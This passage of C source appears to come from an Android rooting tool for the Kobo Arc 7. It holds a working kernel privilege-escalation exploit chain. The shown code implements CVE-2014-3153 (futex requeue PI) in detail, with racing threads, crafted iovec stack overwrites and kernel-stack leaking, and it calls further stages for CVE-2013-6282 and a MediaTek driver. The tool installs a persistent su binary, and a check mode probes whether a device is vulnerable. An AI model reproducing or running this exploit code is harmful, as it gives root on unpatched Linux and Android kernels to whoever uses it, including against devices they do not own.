    sigaction(14, &a, NULL);

    unsigned long databuf[0x20];
    struct iovec msg_iov[8]; /* Fixed buffer bounds from reference PoC! */
    for (int i = 0; i < 0x20; i++) databuf[i] = f_hacked_node;
    for (int i = 0; i < 8; i++) {
        msg_iov[i].iov_base = (void *)f_hacked_node;
        msg_iov[i].iov_len = 0x80;
    }
    msg_iov[2].iov_base = (void *)f_hacked_node;
    msg_iov[2].iov_len = f_hacked_node_alt;

    struct arc7_mmsghdr msgvec[1];
    memset(&msgvec, 0, sizeof(msgvec));
    msgvec[0].msg_hdr.msg_name = databuf;
    msgvec[0].msg_hdr.msg_namelen = 0x80;
    msgvec[0].msg_hdr.msg_iov = msg_iov;
    msgvec[0].msg_hdr.msg_iovlen = 8;
    msgvec[0].msg_hdr.msg_control = databuf;
    msgvec[0].msg_hdr.msg_controllen = 0x20;

    int cfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons((uint16_t)f_port);
    sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    while (connect(cfd, (struct sockaddr *)&sin, sizeof(sin)) < 0) usleep(1000);
    int small = 1;
    setsockopt(cfd, SOL_SOCKET, SO_SNDBUF, &small, sizeof(small));

    syscall(__NR_futex, &f_lock1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &f_lock2, 0);
    if (syscall(__NR_sendmmsg, cfd, msgvec, 1, 0) <= 0) f_send_msg(F_ERR);
    return NULL;
}

static void *f_trigger_thread(void *arg) {
    (void)arg;
    char wbuf[0x1000];
    memset(wbuf, 0, sizeof(wbuf));
    setpriority(PRIO_PROCESS, 0, 5);

    syscall(__NR_futex, &f_lock2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
    while (syscall(__NR_futex, &f_lock1, FUTEX_CMP_REQUEUE_PI, 1, 0, &f_lock2, f_lock1) != 1)
        usleep(100);

    f_spawn_waiter(3);
    f_pid6 = f_spawn_waiter(6);
    f_pid7 = f_spawn_waiter(7);

    f_lock2 = 0;
    syscall(__NR_futex, &f_lock2, FUTEX_CMP_REQUEUE_PI, 1, 0, &f_lock2, f_lock2);
    sleep(1);

    f_reset_hacked_list(f_hacked_node);
    f_reset_hacked_list(f_hacked_node_alt);

    unsigned long prev_val = *((unsigned long *)f_hacked_node);
    f_tid11 = f_spawn_waiter(11);
    if (*((unsigned long *)f_hacked_node) == prev_val)
        f_hacked_node = f_hacked_node_alt;
    if (*((unsigned long *)f_hacked_node) == prev_val) {
        f_send_msg(F_ERR);
        return NULL;
    }

    f_t11 = *((unsigned long *)f_hacked_node);
    for (int k = 0; k < 12; k++) {
        f_is_kernel_writing = (pthread_mutex_t *)malloc(sizeof(pthread_mutex_t));
        pthread_mutex_init(f_is_kernel_writing, NULL);
        f_reset_hacked_list(f_hacked_node);
        pid_t pid = f_spawn_waiter(11);
        f_first_kstack = f_leaker_kstack = *((unsigned long *)f_hacked_node) & 0xffffe000UL;

        pthread_mutex_lock(&f_awake_lock);
        kill(pid, 12);
        pthread_cond_wait(&f_awake, &f_awake_lock);
        pthread_mutex_unlock(&f_awake_lock);
        usleep(500000);

        f_reset_hacked_list(f_hacked_node);
        *((unsigned long *)(f_hacked_node + 0x24)) = f_first_kstack + 8;
        f_tid12 = f_spawn_waiter(12);
        unsigned long limit_val = *((unsigned long *)(f_hacked_node + 0x24));
        f_remove_pid[f_remove_count] = f_tid12;
        f_remove_waiter[f_remove_count] = limit_val;
        f_remove_count++;

        for (int i = 0; i < 10; i++) {
            f_reset_hacked_list(f_hacked_node);
            pid = f_spawn_waiter(10);
            if (*((unsigned long *)f_hacked_node) < limit_val) {
                f_final_kstack = *((unsigned long *)f_hacked_node) & 0xffffe000UL;
                pthread_mutex_lock(&f_awake_lock);
                kill(pid, 12);
                pthread_cond_wait(&f_awake, &f_awake_lock);
                pthread_mutex_unlock(&f_awake_lock);
                sleep(1);
                f_reset_hacked_list(f_hacked_node);
                if (write(f_hacks_fdm, wbuf, sizeof(wbuf)) < 0) { /* ignore */ }
                while (1) sleep(10);
            }
        }
    }
    f_send_msg(F_ERR);
    return NULL;
}

static int try_stage3_cve_2014_3153(const char *su_src) {
    printf("[Stage 3] Attempting CVE-2014-3153 (futex_requeue PI elevation)...\n");
    fflush(stdout);
    g_su_source_path = su_src;

    if (pipe(f_pipe_fd) != 0) return -1;
    pid_t child = fork();
    if (child != 0) {
        close(f_pipe_fd[1]);
        int msg = 0, got_root = 0;
        while (read(f_pipe_fd[0], &msg, sizeof(msg)) == sizeof(msg)) {
            if (msg == F_ROOT_SUCCESS) got_root = 1;
            if (msg == F_ALL_DONE || msg == F_ERR || msg == F_FIX_SUCCESS) break;
        }
        close(f_pipe_fd[0]);
        int status = 0;
        waitpid(child, &status, 0);
        if (got_root && access("/system/xbin/su", X_OK) == 0) {
            printf("[Stage 3] SUCCESS! Persistent root installed via CVE-2014-3153!\n");
            fflush(stdout);
            return 0;
        }
        return -1;
    }

    alarm(35);
    close(f_pipe_fd[0]);

    unsigned long m1 = (unsigned long)mmap((void *)0xa0000000UL, 0x110000,
        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    unsigned long m2 = (unsigned long)mmap((void *)0x00100000UL, 0x110000,
        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    if (m1 == (unsigned long)MAP_FAILED || m2 == (unsigned long)MAP_FAILED) {
        f_send_msg(F_ERR);
        _exit(1);
    }
    f_hacked_node = m1 + 0x800;
    f_hacked_node_alt = m2 + 0x800;

    pthread_t t_acc, t_mod, t_trig;
    pthread_create(&t_acc, NULL, f_accept_thread, NULL);
    usleep(300000);
    pthread_mutex_lock(&f_done_lock);
    pthread_create(&t_mod, NULL, f_stack_modifier, NULL);
    pthread_create(&t_trig, NULL, f_trigger_thread, NULL);
    pthread_cond_wait(&f_done, &f_done_lock);
    f_send_msg(F_ALL_DONE);
    _exit(0);
}

/* =========================================================================
 * SUPERVISED CHILD EXECUTION & CLI ENTRYPOINT
 * ========================================================================= */
static int run_isolated_stage(const char *label, int (*stage_fn)(const char *), const char *su_src, int timeout_sec) {
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        alarm((unsigned int)timeout_sec);
        int rc = stage_fn(su_src);
        _exit(rc == 0 ? 0 : 1);
    }
    int status = 0;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        return 0;
    }
    if (WIFSIGNALED(status)) {
        printf("[%s] Isolated worker exited cleanly on signal %d; proceeding safely.\n",
               label, WTERMSIG(status));
        fflush(stdout);
    }
    return -1;
}

int main(int argc, char **argv) {
    if (argc >= 2 && strcmp(argv[1], "--check") == 0) {
        struct utsname uts;
        memset(&uts, 0, sizeof(uts));
        uname(&uts);
        printf("CURRENT_UID=%d\n", (int)getuid());
        printf("KERNEL_RELEASE=%s\n", uts.release);
        printf("KERNEL_VERSION=%s\n", uts.version);
        printf("MACHINE=%s\n", uts.machine);
        printf("EXISTING_XBIN_SU=%s\n", access("/system/xbin/su", X_OK) == 0 ? "YES" : "NO");
        printf("EXISTING_BIN_SU=%s\n", access("/system/bin/su", X_OK) == 0 ? "YES" : "NO");

        pid_t p = fork();
        if (p == 0) {
            alarm(3);
            _exit(cve6282_probe_vulnerable() ? 42 : 0);
        }
        int st = 0;
        waitpid(p, &st, 0);
        printf("PROBE_CVE_2013_6282=%s\n",
               (WIFEXITED(st) && WEXITSTATUS(st) == 42) ? "VULNERABLE" : "PATCHED_OR_PROTECTED");

        const char *mdevs[] = { "/dev/devmap", "/dev/exm0", "/dev/camera-isp", NULL };
        int mtk_openable = 0;
        for (int i = 0; mdevs[i]; i++) {
            int fd = open(mdevs[i], O_RDWR);
            if (fd >= 0) { mtk_openable = 1; close(fd); break; }
        }
        printf("PROBE_MTK_DRIVER=%s\n", mtk_openable ? "ACCESSIBLE" : "RESTRICTED");
        return 0;
    }

    if (argc >= 3 && strcmp(argv[1], "--install-only") == 0) {
        return arc7_install_persistent_root(argv[2]) == 0 ? 0 : 1;
    }

    if (argc >= 3 && strcmp(argv[1], "--root") == 0) {
        const char *su_src = argv[2];
        if (access(su_src, R_OK) != 0) {
            fprintf(stderr, "ERROR: su binary source not readable at %s\n", su_src);
            return 2;
        }
        printf("=== Kobo Arc 7 Freedom Root Engine Starting ===\n");
        fflush(stdout);

        if (run_isolated_stage("Stage 0", try_stage0_existing_su, su_src, 15) == 0) return 0;
        if (run_isolated_stage("Stage 1", try_stage1_cve_2013_6282, su_src, 30) == 0) return 0;
        if (run_isolated_stage("Stage 2", try_stage2_mtk_driver_mmap, su_src, 25) == 0) return 0;
        if (run_isolated_stage("Stage 3", try_stage3_cve_2014_3153, su_src, 40) == 0) return 0;

        fprintf(stderr, "ROOT_FAILED: All on-device kernel exploit stages completed without uid=0. "
                        "Use the included USB ADB companion script (tools/usb-sideload-and-root.sh) if running patched firmware.\n");
        return 1;
    }

    printf("Usage:\n  %s --check\n  %s --root <path_to_libarc7su.so>\n  %s --install-only <path_to_libarc7su.so>\n",
           argv[0], argv[0], argv[0]);
    return 0;
}
